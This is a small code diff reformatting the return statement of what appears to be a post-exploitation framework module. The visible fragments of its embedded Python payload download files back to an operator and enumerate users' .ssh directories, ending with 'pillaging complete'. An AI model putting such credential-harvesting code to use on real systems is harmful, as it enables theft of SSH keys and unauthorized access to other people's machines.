@@ -80,7 +80,8 @@ class Module:
         sleep = self.options['Sleep']['Value']
         allUsers = self.options['AllUsers']['Value']
 
-        script = """
+        return (
+            """
 import os
 # custom function to send downloac packets back
 def downloadFile(path):
@@ -140,6 +141,6 @@ for userPath in userPaths:
             print userPath + '/.ssh/' + sshFile
 
 print "pillaging complete"
-""" % {'sleep': sleep, 'allUsers': allUsers}
-
-        return script
+"""
+            % {'sleep': sleep, 'allUsers': allUsers}
+        )
